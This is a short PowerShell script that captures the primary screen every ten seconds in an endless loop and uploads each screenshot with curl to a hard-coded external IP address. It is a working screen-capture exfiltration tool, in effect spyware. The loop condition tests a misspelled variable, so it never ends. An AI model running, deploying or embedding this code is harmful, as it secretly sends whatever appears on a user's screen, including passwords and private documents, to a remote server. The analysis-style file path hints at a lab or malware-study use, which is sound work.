[cmdletbinding()]            
param(            
  [string]$Width,            
  [string]$Height,            
  [String]$FileName = "Screenshot"            

)            

#Function to take screenshot. This function takes the width and height of the screen that has            
#to be captured            

function Take-Screenshot{            
[cmdletbinding()]            
param(            
 [Drawing.Rectangle]$bounds,             
 [string]$path            
)             
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height            
   $graphics = [Drawing.Graphics]::FromImage($bmp)            
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)            
   $bmp.Save($path)            
   $graphics.Dispose()            
   $bmp.Dispose()            
}            

#Function to get the primary monitor resolution.            
#This code is sourced from             
# http://techibee.com/powershell/powershell-script-to-get-desktop-screen-resolution/1615            

function Get-ScreenResolution {            
 $Screens = [system.windows.forms.screen]::AllScreens                        
 foreach ($Screen in $Screens) {            
  $DeviceName = $Screen.DeviceName            
  $Width  = $Screen.Bounds.Width            
  $Height  = $Screen.Bounds.Height            
  $IsPrimary = $Screen.Primary                        
  $OutputObj = New-Object -TypeName PSobject            
  $OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName            
  $OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width            
  $OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height            
  $OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary            
  $OutputObj                        
 }            
}            

#Main script begins            

#By default captured screenshot will be saved in %temp% folder            
#You can override it here if you want            

$infiniteLoop = 0
$count = 0
$postTo = "54.149.6.150/image"
$originalFileName = $FileName
While ($infinteLoop -le 1) {
    $count += 1
    $FileName = $originalFileName + $count
    $Filepath = join-path $env:temp $FileName      

    [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")            
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")            

    if(!($width -and $height)) {

     $screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}            
     $Width = $screen.Width            
     $Height = $screen.height
    }            

    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height)            

    Take-Screenshot -Bounds $bounds -Path "$Filepath.png"            

    # log what I'm doing
    Write-Host "Posting file: " "$FilePath.png" " via cURL to server at: " $postTo
    
    #post the file to the server
    C:\Analysis\ext_bin\curl.exe -F image="@$Filepath.png" $postTo
    	    
    #Now you have the screenshot
    
    #Pause script for 10 seconds
    Start-Sleep -s 10
}
